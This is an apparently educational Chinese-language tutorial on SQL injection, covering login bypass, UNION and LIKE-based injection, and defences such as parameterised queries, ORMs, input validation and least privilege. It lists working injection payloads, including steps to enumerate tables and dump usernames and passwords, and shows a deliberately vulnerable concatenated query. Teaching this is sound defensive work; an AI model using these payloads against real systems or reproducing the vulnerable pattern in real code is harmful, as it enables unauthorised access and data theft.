# SQL 注入攻击

## 什么是 SQL 注入？

SQL 注入是一种代码注入攻击，攻击者通过在输入中插入恶意 SQL 代码，操纵数据库查询。

## 攻击类型

### 登录绕过

```sql
-- 原始查询
SELECT * FROM users WHERE username='输入' AND password='输入'

-- 注入后
SELECT * FROM users WHERE username='admin'--' AND password='xxx'
```

**Payload:**
- `admin'--`
- `' OR '1'='1`
- `' OR 1=1--`

### UNION 注入

窃取其他表的数据：

```sql
-- 原始查询
SELECT id, username, role FROM users WHERE id=1

-- 注入后
SELECT id, username, role FROM users WHERE id=-1
UNION SELECT id, content, level FROM secrets
```

**攻击步骤：**
1. 确定列数: `1 ORDER BY 3--`
2. 确定显示位: `-1 UNION SELECT 1,2,3--`
3. 查询表名: `-1 UNION SELECT 1,name,3 FROM sqlite_master--`
4. 窃取数据: `-1 UNION SELECT id,content,level FROM secrets--`

### 搜索注入

```sql
-- 原始查询
SELECT * FROM users WHERE username LIKE '%关键词%'

-- 注入后
SELECT * FROM users WHERE username LIKE '%' OR 1=1--%'
```

## 实验演示

访问 [SQL注入实验](/labs/sql-injection) 进行实践：

1. **登录绕过** - 无需密码登录管理员
2. **UNION 注入** - 窃取 secrets 表数据
3. **搜索注入** - LIKE 语句注入

## 防御方法

### 1. 参数化查询

```javascript
// ❌ 有漏洞
const sql = `SELECT * FROM users WHERE username='${username}'`

// ✅ 安全
const sql = 'SELECT * FROM users WHERE username=?'
db.prepare(sql).get(username)
```

### 2. ORM 框架

```javascript
// 使用 Sequelize
User.findOne({ where: { username } })
```

### 3. 输入验证

```javascript
// 只允许字母数字
if (!/^[a-zA-Z0-9]+$/.test(username)) {
  throw new Error('Invalid username')
}
```

### 4. 最小权限

数据库账户只给必要的权限，不要使用 root。

## 测试 Payload

```
' OR '1'='1
' OR 1=1--
admin'--
' UNION SELECT 1,2,3--
' UNION SELECT null,username,password FROM users--
```
